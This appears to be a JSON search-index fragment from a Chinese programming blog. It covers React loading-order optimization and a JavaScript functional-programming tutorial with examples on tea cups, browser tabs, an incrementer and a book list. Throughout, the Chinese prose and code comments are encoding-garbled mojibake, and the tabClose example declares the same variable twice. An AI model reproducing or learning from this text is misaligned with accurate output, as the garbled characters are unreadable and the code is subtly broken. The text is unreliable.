ä¼˜å…ˆçº§ä¹Ÿå­˜åœ¨ä¸€äº›æ½œåœ¨çš„é—®é¢˜ï¼Œè¿™ä½¿å¾—ä¼˜åŒ–æ’åºå˜å¾—å›°éš¾ã€‚ ä¸»è¦æ˜¯ï¼Œæˆ‘ä»¬æ— æ³•é¢„æµ‹æœåŠ¡å™¨æˆ– CDN å°†æŒ‰ä»€ä¹ˆé¡ºåºä¼˜å…ˆå¤„ç†å¯¹å•ä¸ªèµ„æºçš„è¯·æ±‚ã€‚ ä¸€äº› CDN é‡æ–°ç¡®å®šè¯·æ±‚çš„ä¼˜å…ˆçº§ï¼Œè€Œå…¶ä»– CDN å®æ–½éƒ¨åˆ†ã€æœ‰ç¼ºé™·æˆ–æ²¡æœ‰ä¼˜å…ˆçº§ã€‚\nèµ„æºçº§ä¼˜åŒ–\næœ‰æ•ˆçš„æ’åºéœ€è¦æ­£åœ¨æ’åºçš„èµ„æºå¾—åˆ°æœ€ä½³æœåŠ¡ï¼Œä»¥ä¾¿å®ƒä»¬èƒ½å¤Ÿå¿«é€ŸåŠ è½½ã€‚ å…³é”®çš„ CSS åº”è¯¥è¢«å†…è”ï¼Œå›¾åƒçš„å¤§å°åº”è¯¥æ­£ç¡®ï¼ŒJS åº”è¯¥æ˜¯ä»£ç æ‹†åˆ†å’Œå¢é‡äº¤ä»˜çš„ã€‚\nè¯¥æ¡†æ¶æœ¬èº«ç¼ºä¹å…è®¸ä»£ç æ‹†åˆ†å’Œå¢é‡æœåŠ¡ JS å’Œæ•°æ®çš„ç»“æ„ã€‚ ç”¨æˆ·å¿…é¡»ä¾é ä»¥ä¸‹ä¹‹ä¸€æ¥æ‹†åˆ†å¤§å—çš„ 1P JS\n  Modern React (Suspense / Concurrent mode / Data Fetching) - è¿™ä»ç„¶ä»…å¯ç”¨äºå®éªŒ\n  ä½¿ç”¨åŠ¨æ€å¯¼å…¥çš„å»¶è¿ŸåŠ è½½ - è¿™ä¸ç›´è§‚ï¼Œå¼€å‘äººå‘˜éœ€è¦æ‰‹åŠ¨ç¡®å®šæ‹†åˆ†ä»£ç çš„è¾¹ç•Œã€‚\n  åœ¨ä»£ç æ‹†åˆ†æ—¶ï¼Œç”±äºç²’åº¦ä¸æ€§èƒ½çš„æƒè¡¡ï¼Œå¼€å‘äººå‘˜éœ€è¦å®ç°å—çš„æ­£ç¡®ç²’åº¦ã€‚\næ›´é«˜çš„ç²’åº¦æ˜¯å¯å–çš„ï¼Œå› ä¸ºå®ƒ\n  æœ€å°åŒ–å•ä¸ªè·¯ç”±å’Œåç»­ç”¨æˆ·äº¤äº’æ‰€éœ€çš„ JS\n  å…è®¸ç¼“å­˜å¸¸è§çš„ä¾èµ–é¡¹ã€‚ è¿™ç¡®ä¿åº“ä¸­çš„æ›´æ”¹ä¸éœ€è¦é‡æ–°è·å–æ•´ä¸ªåŒ…ã€‚\n  åŒæ—¶ï¼Œä»£ç æ‹†åˆ†æ—¶çš„ç²’åº¦å¤ªå¤§å¯èƒ½å¾ˆç³Ÿç³•ï¼Œå› ä¸ºå¤ªå¤šçš„å°å—ä¼šé™ä½å•ä¸ªå—çš„å‹ç¼©ç‡å¹¶å½±å“æµè§ˆå™¨æ€§èƒ½ã€‚\nèµ„æºä¼˜åŒ–è¿˜éœ€è¦æ¶ˆé™¤æ­»ä»£ç æˆ–æœªä½¿ç”¨çš„ä»£ç ã€‚ ä¸å¿…è¦çš„æˆ–è¿‡æ—¶çš„ JS å¯èƒ½ç»å¸¸è¢«è¿é€åˆ°ç°ä»£æµè§ˆå™¨ï¼Œè¿™ä¼šå¯¹æ€§èƒ½äº§ç”Ÿè´Ÿé¢å½±å“ã€‚ ç°ä»£æµè§ˆå™¨ä¸éœ€è¦å°† JS è½¬è¯‘ä¸º ES5 å¹¶ä¸ polyfill æ†ç»‘åœ¨ä¸€èµ·ã€‚ åº“å’Œ npm åŒ…é€šå¸¸ä¸ä»¥ ES æ¨¡å—æ ¼å¼å‘å¸ƒã€‚ è¿™ä½¿å¾—æ‰“åŒ…è€…å¾ˆéš¾è¿›è¡Œæ‘‡æ ‘å’Œä¼˜åŒ–\næ‚¨å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼Œè¿™äº›é—®é¢˜å¹¶ä¸é™äºä¸€ç»„ç‰¹å®šçš„èµ„æºæˆ–å¹³å°ã€‚ è¦è§£å†³è¿™äº›é—®é¢˜ï¼Œéœ€è¦äº†è§£æ•´ä¸ªæŠ€æœ¯å †æ ˆä»¥åŠå¦‚ä½•åˆå¹¶ä¸åŒçš„èµ„æºä»¥å®ç°æœ€ä½³æŒ‡æ ‡ã€‚ åœ¨æˆ‘ä»¬å®šä¹‰æ•´ä½“ä¼˜åŒ–ç­–ç•¥ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆçœ‹çœ‹å•ä¸ªèµ„æºéœ€æ±‚æ˜¯å¦‚ä½•ç ´åæˆ‘ä»¬çš„ç›®æ ‡çš„ã€‚\n\ræœ‰å…³èµ„æºçš„æ›´å¤šä¿¡æ¯ - å…³ç³»ã€çº¦æŸå’Œä¼˜å…ˆçº§ \rçŸ¥è¯†ç‚¹    ","description":"äº†è§£å¦‚ä½•ä¼˜åŒ–åŠ è½½é¡ºåºä»¥æé«˜åº”ç”¨çš„å¯ç”¨é€Ÿåº¦","id":28,"section":"react-patterns","tags":null,"title":"ä¼˜åŒ–åŠ è½½é¡ºåº","uri":"https://codthing.github.io/react-patterns/performance-patterns/loading-sequence/"},{"content":"ä¸€ã€æ¦‚è¿° å‡½æ•°å¼ç¼–ç¨‹æ˜¯ä¸€ç§æ–¹æ¡ˆç®€å•ã€åŠŸèƒ½ç‹¬ç«‹ã€å¯¹ä½œç”¨åŸŸå¤–æ²¡æœ‰ä»»ä½•å‰¯ä½œç”¨çš„ç¼–ç¨‹èŒƒå¼ï¼šINPUT -\u0026gt; PROCESS -\u0026gt; OUTPUT\nå‡½æ•°å¼ç¼–ç¨‹ï¼š\n1ï¼‰åŠŸèƒ½ç‹¬ç«‹ â€”â€” ä¸ä¾èµ–äºç¨‹åºçš„çŠ¶æ€ï¼ˆæ¯”å¦‚å¯èƒ½å‘ç”Ÿå˜åŒ–çš„å…¨å±€å˜é‡ï¼‰ï¼›\n2ï¼‰çº¯å‡½æ•° â€”â€” åŒä¸€ä¸ªè¾“å…¥æ°¸è¿œèƒ½å¾—åˆ°åŒä¸€ä¸ªè¾“å‡ºï¼›\n3ï¼‰æœ‰é™çš„å‰¯ä½œç”¨ â€”â€” å¯ä»¥ä¸¥æ ¼åœ°é™åˆ¶å‡½æ•°å¤–éƒ¨å¯¹çŠ¶æ€çš„æ›´æ”¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // å‡½æ•°è¿”å›è¡¨ç¤ºâ€œä¸€æ¯ç»¿èŒ¶ï¼ˆgreen teaï¼‰â€çš„å­—ç¬¦ä¸² const prepareTea = () =\u0026gt; \u0026#39;greenTea\u0026#39;; /* æœ‰ä¸€ä¸ªå‡½æ•°ï¼ˆä»£è¡¨èŒ¶çš„ç§ç±»ï¼‰å’Œéœ€è¦å‡ æ¯èŒ¶ï¼Œä¸‹é¢çš„å‡½æ•°è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«å­—ç¬¦ä¸²ï¼ˆæ¯ä¸ªå­—ç¬¦ä¸²è¡¨ç¤ºä¸€æ¯ç‰¹åˆ«ç§ç±»çš„èŒ¶ï¼‰ã€‚ */ const getTea = (numOfCups) =\u0026gt; { const teaCups = []; for(let cups = 1; cups \u0026lt;= numOfCups; cups += 1) { const teaCup = prepareTea(); teaCups.push(teaCup); } return teaCups; }; const tea4TeamFCC = getTea(2); // [ \u0026#39;greenTea\u0026#39;, \u0026#39;greenTea\u0026#39; ]   \räºŒã€äº†è§£å‡½æ•°å¼ç¼–ç¨‹æœ¯è¯­ éœ€æ±‚æœ‰å˜æ›´ï¼Œç°åœ¨æƒ³è¦ä¸¤ç§èŒ¶ï¼šç»¿èŒ¶ï¼ˆgreen teaï¼‰å’Œçº¢èŒ¶ï¼ˆblack teaï¼‰ã€‚ äº‹å®è¯æ˜ï¼Œç”¨æˆ·éœ€æ±‚å˜æ›´æ˜¯å¾ˆå¸¸è§çš„ã€‚\nåŸºäºä»¥ä¸Šä¿¡æ¯ï¼Œéœ€è¦é‡æ„ä¸Šä¾‹ä¸­çš„ getTea å‡½æ•°æ¥å¤„ç†å¤šç§èŒ¶çš„è¯·æ±‚ã€‚\nå¯ä»¥ä¿®æ”¹ getTea æ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œä½¿å®ƒèƒ½å¤Ÿä¿®æ”¹èŒ¶çš„ç±»å‹ã€‚ è¿™è®© getTea æ›´çµæ´»ï¼Œä¹Ÿä½¿éœ€æ±‚å˜æ›´æ—¶ä¸ºç¨‹åºå‘˜æä¾›æ›´å¤šæ§åˆ¶æƒã€‚\né¦–å…ˆï¼Œä»‹ç»ä¸€äº›æœ¯è¯­ï¼š\nCallbacks æ˜¯è¢«ä¼ é€’åˆ°å¦ä¸€ä¸ªå‡½æ•°ä¸­è°ƒç”¨çš„å‡½æ•°ã€‚\nä¾‹å¦‚åœ¨ filter ä¸­ï¼Œå›è°ƒå‡½æ•°å‘Šè¯‰ JavaScript ä»¥ä»€ä¹ˆè§„åˆ™è¿‡æ»¤æ•°ç»„ã€‚\nå‡½æ•°å°±åƒå…¶ä»–æ­£å¸¸å€¼ä¸€æ ·ï¼Œå¯ä»¥èµ‹å€¼ç»™å˜é‡ã€ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°ï¼Œæˆ–ä»å…¶å®ƒå‡½æ•°è¿”å›ï¼Œè¿™ç§å‡½æ•°å«åšå¤´ç­‰ first class å‡½æ•°ã€‚\nåœ¨ JavaScript ä¸­ï¼Œæ‰€æœ‰å‡½æ•°éƒ½æ˜¯å¤´ç­‰å‡½æ•°ã€‚\nå°†å‡½æ•°ä½œä¸ºå‚æ•°æˆ–è¿”å›å€¼çš„å‡½æ•°å«åšé«˜é˜¶ ( higher order) å‡½æ•°ã€‚\nå½“å‡½æ•°è¢«ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°æˆ–ä»å¦ä¸€ä¸ªå‡½æ•°è¿”å›æ—¶ï¼Œé‚£äº›ä¼ å…¥æˆ–è¿”å›çš„å‡½æ•°å¯ä»¥å«åš lambdaã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  // å‡½æ•°è¿”å›è¡¨ç¤ºâ€œä¸€æ¯ç»¿èŒ¶ï¼ˆgreen teaï¼‰â€çš„å­—ç¬¦ä¸² const prepareGreenTea = () =\u0026gt; \u0026#39;greenTea\u0026#39;; // å‡½æ•°è¿”å›è¡¨ç¤ºâ€œä¸€æ¯çº¢èŒ¶ï¼ˆblack teaï¼‰â€çš„å­—ç¬¦ä¸² const prepareBlackTea = () =\u0026gt; \u0026#39;blackTea\u0026#39;; /* æœ‰ä¸€ä¸ªå‡½æ•°ï¼ˆä»£è¡¨èŒ¶çš„ç§ç±»ï¼‰å’Œéœ€è¦å‡ æ¯èŒ¶ï¼Œä¸‹é¢çš„å‡½æ•°è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«å­—ç¬¦ä¸²ï¼ˆæ¯ä¸ªå­—ç¬¦ä¸²è¡¨ç¤ºä¸€æ¯ç‰¹åˆ«ç§ç±»çš„èŒ¶ï¼‰ã€‚ */ const getTea = (prepareTea, numOfCups) =\u0026gt; { const teaCups = []; for(let cups = 1; cups \u0026lt;= numOfCups; cups += 1) { const teaCup = prepareTea(); teaCups.push(teaCup); } return teaCups; }; const tea4GreenTeamFCC = getTea(prepareGreenTea, 1); // [ \u0026#39;greenTea\u0026#39; ] const tea4BlackTeamFCC = getTea(prepareBlackTea, 2); // [ \u0026#39;blackTea\u0026#39;, \u0026#39;blackTea\u0026#39; ]   \rä¸‰ã€äº†è§£ä½¿ç”¨å‘½ä»¤å¼ç¼–ç¨‹çš„å±å®³ ä½¿ç”¨ å‡½æ•°å¼ç¼–ç¨‹ æ˜¯ä¸€ä¸ªå¥½çš„ä¹ æƒ¯ã€‚\nå®ƒä½¿ä»£ç æ˜“äºç®¡ç†ï¼Œé¿å…æ½œåœ¨çš„ bugã€‚\nä½†åœ¨å¼€å§‹ä¹‹å‰ï¼Œå…ˆçœ‹çœ‹ å‘½ä»¤å¼ç¼–ç¨‹ æ–¹æ³•ï¼Œä»¥è¯´æ˜å¯èƒ½ä¼šé‡åˆ°ä»€ä¹ˆé—®é¢˜ã€‚\nåœ¨è‹±è¯­ (ä»¥åŠè®¸å¤šå…¶ä»–è¯­è¨€) ä¸­ï¼Œå‘½ä»¤å¼ æ—¶å¸¸ç”¨æ¥å‘å‡ºæŒ‡ä»¤ã€‚ åŒæ ·ï¼Œå‘½ä»¤å¼ç¼–ç¨‹ æ˜¯å‘è®¡ç®—æœºæä¾›ä¸€å¥—æ‰§è¡Œä»»åŠ¡çš„å£°æ˜ã€‚\nå‘½ä»¤å¼ç¼–ç¨‹ å¸¸å¸¸æ”¹å˜ç¨‹åºçŠ¶æ€ï¼Œä¾‹å¦‚æ›´æ–°å…¨å±€å˜é‡ã€‚ ä¸€ä¸ªå…¸å‹çš„ä¾‹å­æ˜¯ç¼–å†™ for å¾ªç¯ï¼Œå®ƒä¸ºä¸€ä¸ªæ•°ç»„çš„ç´¢å¼•æä¾›äº†å‡†ç¡®çš„è¿­ä»£æ–¹å‘ã€‚\nç›¸åï¼Œå‡½æ•°å¼ç¼–ç¨‹æ˜¯å£°æ˜å¼ç¼–ç¨‹çš„ä¸€ç§å½¢å¼ã€‚ é€šè¿‡è°ƒç”¨æ–¹æ³•æˆ–å‡½æ•°æ¥å‘Šè¯‰è®¡ç®—æœºè¦åšä»€ä¹ˆã€‚\nJavaScript æä¾›äº†è®¸å¤šå¤„ç†å¸¸è§ä»»åŠ¡çš„æ–¹æ³•ï¼Œæ‰€ä»¥æ— éœ€å†™å‡ºè®©è®¡ç®—æœºåº”å¦‚ä½•æ‰§è¡Œå®ƒä»¬ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥ç”¨ map å‡½æ•°æ›¿ä»£ä¸Šé¢æåˆ°çš„ for å¾ªç¯æ¥å¤„ç†æ•°ç»„è¿­ä»£ã€‚ è¿™æœ‰åŠ©äºé¿å…è¯­ä¹‰é”™è¯¯ï¼Œå¦‚è°ƒè¯•ç« èŠ‚ä»‹ç»çš„ \u0026ldquo;Off By One Errors\u0026rdquo;ã€‚\nè€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼šåœ¨æµè§ˆå™¨ä¸­æµè§ˆç½‘é¡µï¼Œå¹¶æƒ³æ“ä½œæ‰“å¼€çš„æ ‡ç­¾ã€‚\nä¸‹é¢è¯•è¯•ç”¨ é¢å‘å¯¹è±¡ çš„æ€è·¯æ¥æè¿°è¿™ç§æƒ…æ™¯ã€‚\n çª—å£å¯¹è±¡ç”±é€‰é¡¹å¡ç»„æˆï¼Œé€šå¸¸ä¼šæ‰“å¼€å¤šä¸ªçª—å£ã€‚ çª—å£å¯¹è±¡ä¸­æ¯ä¸ªæ‰“å¼€ç½‘ç«™çš„æ ‡é¢˜éƒ½ä¿å­˜åœ¨ä¸€ä¸ªæ•°ç»„ä¸­ã€‚ åœ¨å¯¹æµè§ˆå™¨è¿›è¡Œäº†å¦‚æ‰“å¼€æ–°æ ‡ç­¾ã€åˆå¹¶çª—å£ã€å…³é—­æ ‡ç­¾ä¹‹ç±»çš„æ“ä½œåï¼Œéœ€è¦è¾“å‡ºæ‰€æœ‰æ‰“å¼€çš„æ ‡ç­¾ã€‚ å…³æ‰çš„æ ‡ç­¾å°†ä»æ•°ç»„ä¸­åˆ é™¤ï¼Œæ–°æ‰“å¼€çš„æ ‡ç­¾ï¼ˆä¸ºç®€å•èµ·è§ï¼‰åˆ™æ·»åŠ åˆ°æ•°ç»„çš„æœ«å°¾ã€‚  ä»£ç ç¼–è¾‘å™¨ä¸­æ˜¾ç¤ºäº†æ­¤åŠŸèƒ½çš„å®ç°ï¼Œå…¶ä¸­åŒ…å« tabOpen()ï¼ŒtabClose()ï¼Œå’Œ join() å‡½æ•°ã€‚ tabs æ•°ç»„æ˜¯çª—å£å¯¹è±¡çš„ä¸€éƒ¨åˆ†ç”¨äºå‚¨å­˜æ‰“å¼€é¡µé¢çš„åç§°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  // tabs æ˜¯åœ¨çª—å£ä¸­æ‰“å¼€çš„æ¯ä¸ªç«™ç‚¹çš„ title çš„æ•°ç»„ const Window = function(tabs) { this.tabs = tabs; // è®°å½•å¯¹è±¡å†…éƒ¨çš„æ•°ç»„ }; // å½“å°†ä¸¤ä¸ªçª—å£åˆå¹¶ä¸ºä¸€ä¸ªçª—å£æ—¶ Window.prototype.join = function(otherWindow) { this.tabs = this.tabs.concat(otherWindow.tabs); return this; }; // å½“åœ¨æœ€åæ‰“å¼€ä¸€ä¸ªé€‰é¡¹å¡æ—¶ Window.prototype.tabOpen = function(tab) { this.tabs.push(\u0026#39;new tab\u0026#39;); // ç°åœ¨æ‰“å¼€ä¸€ä¸ªæ–°çš„é€‰é¡¹å¡  return this; }; // å½“å…³é—­ä¸€ä¸ªé€‰é¡¹å¡æ—¶ Window.prototype.tabClose = function(index) { // ä½¿ç”¨ splice()ã€‚è¿™ä¼šäº§ç”Ÿå‰¯ä½œç”¨ï¼ˆå¯¹åŸå§‹æ•°ç»„çš„æ›´æ”¹ï¼‰ï¼Œåœ¨å®è·µä¸­åº”è¯¥é¿å…ã€‚  var tabsAfterIndex = this.tabs.splice(index); const tabsBeforeIndex = this.tabs.splice(0, index); // ç‚¹å‡»ä¹‹å‰è·å– tabs  const tabsAfterIndex = this.tabs.splice(1); // ç‚¹å‡»ä¹‹åè·å– tabs  this.tabs = tabsBeforeIndex.concat(tabsAfterIndex); // å°†å®ƒä»¬åˆå¹¶èµ·æ¥  return this; }; // åˆ›å»ºä¸‰ä¸ªæµè§ˆå™¨çª—å£ const workWindow = new Window([\u0026#39;GMail\u0026#39;, \u0026#39;Inbox\u0026#39;, \u0026#39;Work mail\u0026#39;, \u0026#39;Docs\u0026#39;, \u0026#39;freeCodeCamp\u0026#39;]); // é‚®ç®±ã€Google Drive å’Œå…¶ä»–å·¥ä½œåœ°ç‚¹ const socialWindow = new Window([\u0026#39;FB\u0026#39;, \u0026#39;Gitter\u0026#39;, \u0026#39;Reddit\u0026#39;, \u0026#39;Twitter\u0026#39;, \u0026#39;Medium\u0026#39;]); // ç¤¾äº¤ç½‘ç«™ const videoWindow = new Window([\u0026#39;Netflix\u0026#39;, \u0026#39;YouTube\u0026#39;, \u0026#39;Vimeo\u0026#39;, \u0026#39;Vine\u0026#39;]); // å¨±ä¹ç½‘ç«™  // ç°åœ¨æ‰§è¡Œæ‰“å¼€é€‰é¡¹å¡ï¼Œå…³é—­é€‰é¡¹å¡å’Œå…¶ä»–æ“ä½œ const finalTabs = socialWindow .tabOpen() // æ‰“å¼€ä¸€ä¸ªæ–°çš„é€‰é¡¹å¡ï¼Œæ˜¾ç¤ºçŒ«çš„å›¾ç‰‡  .join(videoWindow.tabClose(2)) // å…³é—­è§†é¢‘çª—å£çš„ç¬¬ä¸‰ä¸ªé€‰é¡¹å¡ï¼Œå¹¶åˆå¹¶  .join(workWindow.tabClose(1).tabOpen()); console.log(finalTabs.tabs);   \rä¸‰ã€ä½¿ç”¨å‡½æ•°å¼ç¼–ç¨‹é¿å…å˜åŒ–å’Œå‰¯ä½œç”¨ ä¸Šä¾‹çš„é—®é¢˜å‡ºåœ¨ tabClose() å‡½æ•°é‡Œçš„ spliceã€‚\nä¸å¹¸çš„æ˜¯ï¼Œsplice ä¿®æ”¹äº†è°ƒç”¨å®ƒçš„åŸå§‹æ•°ç»„ï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡è°ƒç”¨å®ƒæ—¶æ˜¯åŸºäºä¿®æ”¹åçš„æ•°ç»„ï¼Œæ‰ç»™å‡ºäº†æ„æ–™ä¹‹å¤–çš„ç»“æœã€‚\nè¿™æ˜¯ä¸€ä¸ªå°ä¾‹å­ï¼Œè¿˜æœ‰æ›´å¹¿ä¹‰çš„å®šä¹‰ â€”â€” åœ¨å˜é‡ï¼Œæ•°ç»„æˆ–å¯¹è±¡ä¸Šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šæ”¹å˜å¯¹è±¡ä¸­çš„å˜é‡æˆ–å…¶ä»–ä¸œè¥¿ã€‚\nå‡½æ•°å¼ç¼–ç¨‹ çš„æ ¸å¿ƒåŸåˆ™ä¹‹ä¸€æ˜¯ä¸æ”¹å˜ä»»ä½•ä¸œè¥¿ã€‚\nå˜åŒ–ä¼šå¯¼è‡´é”™è¯¯ã€‚\nå¦‚æœä¸€ä¸ªå‡½æ•°ä¸æ”¹å˜ä¼ å…¥çš„å‚æ•°ã€å…¨å±€å˜é‡ç­‰æ•°æ®ï¼Œé‚£ä¹ˆå®ƒé€ æˆé—®é¢˜çš„å¯èƒ½æ€§å°±ä¼šå°å¾ˆå¤šã€‚\nå‰é¢çš„ä¾‹å­æ²¡æœ‰ä»»ä½•å¤æ‚çš„æ“ä½œï¼Œä½†æ˜¯ splice æ–¹æ³•æ”¹å˜äº†åŸå§‹æ•°ç»„ï¼Œå¯¼è‡´ bug äº§ç”Ÿã€‚\nåœ¨å‡½æ•°å¼ç¼–ç¨‹ä¸­ï¼Œæ”¹å˜æˆ–å˜æ›´å«åš mutationï¼Œè¿™ç§æ”¹å˜çš„ç»“æœå«åšå‰¯ä½œç”¨ï¼ˆside effectï¼‰ã€‚\nç†æƒ³æƒ…å†µä¸‹ï¼Œå‡½æ•°åº”è¯¥æ˜¯ä¸ä¼šäº§ç”Ÿä»»ä½•å‰¯ä½œç”¨çš„ çº¯å‡½æ•°ï¼ˆpure functionï¼‰ã€‚\nå°è¯•æŒæ¡è¿™ä¸ªåŸåˆ™ï¼šä¸è¦æ”¹å˜ä»£ç ä¸­çš„ä»»ä½•å˜é‡æˆ–å¯¹è±¡ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12  // å…¨å±€å˜é‡ let fixedValue = 4; function incrementer() { return fixedValue + 1; }; console.log(incrementer()); // 5 console.log(fixedValue); // 4   \rå››ã€ä¼ é€’å‚æ•°ä»¥é¿å…å‡½æ•°ä¸­çš„å¤–éƒ¨ä¾èµ– ä¸Šä¾‹æ›´æ¥è¿‘ å‡½æ•°å¼ç¼–ç¨‹ åŸåˆ™ï¼Œä½†æ˜¯ä»ç„¶ç¼ºå°‘ä¸€äº›ä¸œè¥¿ã€‚\nè™½ç„¶æ²¡æœ‰æ”¹å˜å…¨å±€å˜é‡å€¼ï¼Œä½†åœ¨æ²¡æœ‰å…¨å±€å˜é‡ fixedValue çš„æƒ…å†µä¸‹ï¼Œincrementer å‡½æ•°å°†ä¸èµ·ä½œç”¨ã€‚\nå‡½æ•°å¼ç¼–ç¨‹çš„å¦ä¸€ä¸ªåŸåˆ™æ˜¯ï¼šæ€»æ˜¯æ˜¾å¼å£°æ˜ä¾èµ–å…³ç³»ã€‚ å¦‚æœå‡½æ•°ä¾èµ–äºä¸€ä¸ªå˜é‡æˆ–å¯¹è±¡ï¼Œé‚£ä¹ˆå°†è¯¥å˜é‡æˆ–å¯¹è±¡ä½œä¸ºå‚æ•°ç›´æ¥ä¼ é€’åˆ°å‡½æ•°ä¸­ã€‚\nè¿™æ ·åšä¼šæœ‰å¾ˆå¤šå¥½å¤„ã€‚\n  å…¶ä¸­ä¸€ç‚¹æ˜¯è®©å‡½æ•°æ›´å®¹æ˜“æµ‹è¯•ï¼Œå› ä¸ºç¡®åˆ‡åœ°çŸ¥é“å‚æ•°æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”è¿™ä¸ªå‚æ•°ä¹Ÿä¸ä¾èµ–äºç¨‹åºä¸­çš„ä»»ä½•å…¶ä»–å†…å®¹ã€‚\n  å…¶æ¬¡ï¼Œè¿™æ ·åšå¯ä»¥æ›´åŠ è‡ªä¿¡åœ°æ›´æ”¹ï¼Œåˆ é™¤æˆ–æ·»åŠ æ–°ä»£ç ã€‚ å› ä¸ºå¾ˆæ¸…æ¥šå“ªäº›æ˜¯å¯ä»¥æ”¹çš„ï¼Œå“ªäº›æ˜¯ä¸å¯ä»¥æ”¹çš„ï¼Œè¿™æ ·å°±çŸ¥é“å“ªé‡Œå¯èƒ½ä¼šæœ‰æ½œåœ¨çš„é™·é˜±ã€‚\n  æœ€åï¼Œæ— è®ºä»£ç çš„å“ªä¸€éƒ¨åˆ†æ‰§è¡Œå®ƒï¼Œå‡½æ•°æ€»æ˜¯ä¼šä¸ºåŒä¸€ç»„è¾“å…¥ç”Ÿæˆç›¸åŒçš„è¾“å‡ºã€‚\n  1 2 3 4 5 6 7 8 9 10 11 12  // å…¨å±€å˜é‡ let fixedValue = 4; function incrementer(value) { return value + 1 } console.log(incrementer(fixedValue)); // 5 console.log(fixedValue); // 4   \räº”ã€åœ¨å‡½æ•°ä¸­é‡æ„å…¨å±€å˜é‡ ç›®å‰ä¸ºæ­¢ï¼Œå·²ç»çœ‹åˆ°äº†å‡½æ•°å¼ç¼–ç¨‹çš„ä¸¤ä¸ªåŸåˆ™ï¼š\n  ä¸è¦æ›´æ”¹å˜é‡æˆ–å¯¹è±¡ - åˆ›å»ºæ–°å˜é‡å’Œå¯¹è±¡ï¼Œå¹¶åœ¨éœ€è¦æ—¶ä»å‡½æ•°è¿”å›å®ƒä»¬ã€‚ æç¤ºï¼šä½¿ç”¨ç±»ä¼¼ const newArr = arrVar çš„ä¸œè¥¿ï¼Œå…¶ä¸­ arrVar æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œåªä¼šåˆ›å»ºå¯¹ç°æœ‰å˜é‡çš„å¼•ç”¨ï¼Œè€Œä¸æ˜¯å‰¯æœ¬ã€‚ æ‰€ä»¥æ›´æ”¹ newArr ä¸­çš„å€¼ä¼šåŒæ—¶æ›´æ”¹ arrVar ä¸­çš„å€¼ã€‚\n  å£°æ˜å‡½æ•°å‚æ•° - å‡½æ•°å†…çš„ä»»ä½•è®¡ç®—ä»…å–å†³äºå‚æ•°ï¼Œè€Œä¸å–å†³äºä»»ä½•å…¨å±€å¯¹è±¡æˆ–å˜é‡ã€‚\n  ç»™æ•°å­—å¢åŠ  1 ä¸å¤Ÿåˆºæ¿€ï¼Œå¯ä»¥åœ¨å¤„ç†æ•°ç»„æˆ–æ›´å¤æ‚çš„å¯¹è±¡æ—¶åº”ç”¨è¿™äº›åŸåˆ™ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  // å…¨å±€å˜é‡ let bookList = [\u0026#34;è¥¿æ¸¸è®°\u0026#34;, \u0026#34;çº¢æ¥¼æ¢¦\u0026#34;, \u0026#34;é‡‘ç“¶æ¢…\u0026#34;, \u0026#34;æ¥ç”Ÿä¸åšä¸­å›½äºº\u0026#34;]; /* è¿™ä¸ªå‡½æ•°å°†ä¸€æœ¬ä¹¦æ·»åŠ åˆ°åˆ—è¡¨ä¸­å¹¶è¿”å›åˆ—è¡¨ */ // æ–°å‚æ•°åº”è¯¥åœ¨ bookName ä¹‹å‰  function add(list, bookName) { return [...list, bookName]; } /* è¿™ä¸ªå‡½æ•°ä»åˆ—è¡¨ä¸­åˆ é™¤ä¸€æœ¬ä¹¦å¹¶è¿”å›åˆ—è¡¨ */ // æ–°å‚æ•°åº”è¯¥å‡ºç°åœ¨ bookName ä¸€ä¹‹å‰  function remove(list, bookName) { return list.filter(book =\u0026gt; book !== bookName); } let newBookList = add(bookList, \u0026#39;å¯‚é™å²­\u0026#39;); let newerBookList = remove(bookList, \u0026#39;çº¢æ¥¼æ¢¦\u0026#39;); let newestBookList = remove(add(bookList, \u0026#39;å¯‚é™å²­\u0026#39;), \u0026#39;çº¢æ¥¼æ¢¦\u0026#39;); console.log(newBookList); // [ \u0026#39;è¥¿æ¸¸è®°\u0026#39;, \u0026#39;çº¢æ¥¼æ¢¦\u0026#39;, \u0026#39;é‡‘ç“¶æ¢…\u0026#39;, \u0026#39;æ¥ç”Ÿä¸åšä¸­å›½äºº\u0026#39;, \u0026#39;å¯‚é™å²­\u0026#39; ] console.log(newerBookList); // [ \u0026#39;è¥¿æ¸¸è®°\u0026#39;, \u0026#39;é‡‘ç“¶æ¢…\u0026#39;, \u0026#39;æ¥ç”Ÿä¸åšä¸­å›½äºº\u0026#39; ] console.log(newestBookList); // [ \u0026#39;è¥¿æ¸¸è®°\u0026#39;, \u0026#39;é‡‘ç“¶æ¢…\u0026#39;, \u0026#39;æ¥ç”Ÿä¸åšä¸­å›½äºº\u0026#39;, \u0026#39;å¯‚é™å²­\u0026#39; ] console.log(bookList); // [ \u0026#39;è¥¿æ¸¸è®°\u0026#39;, \u0026#39;çº¢æ¥¼æ¢¦\u0026#39;, \u0026#39;é‡‘ç“¶æ¢…\u0026#39;, \u0026#39;æ¥ç”Ÿä¸åšä¸­å›½äºº\u0026#39; ]   \rçŸ¥è¯†ç‚¹  å‡½æ•°å¼ç¼–ç¨‹çš„åŸåˆ™  1ï¼‰åŠŸèƒ½ç‹¬ç«‹ â€”â€” 